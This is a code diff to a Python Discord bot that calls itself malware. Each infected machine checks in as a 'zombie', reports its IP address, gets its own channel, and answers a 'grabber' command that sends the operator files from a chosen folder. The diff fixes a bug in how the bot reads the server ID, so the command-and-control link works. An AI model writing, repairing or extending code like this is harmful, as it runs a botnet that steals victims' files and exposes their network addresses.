@@ -19,7 +19,6 @@ try:
 except:
     pass
 
-
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix="", intents=intents)
@@ -30,20 +29,22 @@ async def ping(ctx):
 
 @bot.event
 async def on_ready():
-    guild = bot.get_guild(os.getenv("DISCORD_GUILD_ID"))  # Use environment variable or default
-    if guild:
-        existing_channel = discord.utils.get(guild.text_channels, name=hostname)
-        if existing_channel:
-            await existing_channel.send(
-                f"```**VAPOURS'S ZOMBIE WHOSE IP ADDRESS IS: {SystemInfo().ip_address} IS PRESENT. "
-                f"MALWARE.VERSION: {VERSION}, TIME: {TIME}**```"
-            )
-        else:
-            new_channel = await guild.create_text_channel(name=hostname)
-            await new_channel.send(
-                f"```**VAPOURS'S ZOMBIE WHOSE IP ADDRESS IS: {SystemInfo().ip_address} IS PRESENT. "
-                f"MALWARE.VERSION: {VERSION}, TIME: {TIME}**```"
-            )
+    guild_id = os.getenv("SERVER_ID")  # Use SERVER_ID as defined in .env
+    if guild_id:
+        guild = bot.get_guild(int(guild_id))  # Convert to int as get_guild expects an int
+        if guild:
+            existing_channel = discord.utils.get(guild.text_channels, name=hostname)
+            if existing_channel:
+                await existing_channel.send(
+                    f"```**VAPOURS'S ZOMBIE WHOSE IP ADDRESS IS: {SystemInfo().ip_address} IS PRESENT. "
+                    f"MALWARE.VERSION: {VERSION}, TIME: {TIME}**```"
+                )
+            else:
+                new_channel = await guild.create_text_channel(name=hostname)
+                await new_channel.send(
+                    f"```**VAPOURS'S ZOMBIE WHOSE IP ADDRESS IS: {SystemInfo().ip_address} IS PRESENT. "
+                    f"MALWARE.VERSION: {VERSION}, TIME: {TIME}**```"
+                )
 
 def is_correct_channel(ctx):
     return ctx.channel.name == hostname
@@ -125,7 +126,6 @@ async def grabber(ctx):
             return
 
         await ctx.send(f"```Grabbing files from folder: {folder}```")
-
         await grab_files_in_folder(ctx, folder)
 
 async def grab_files_in_folder(ctx, folder):
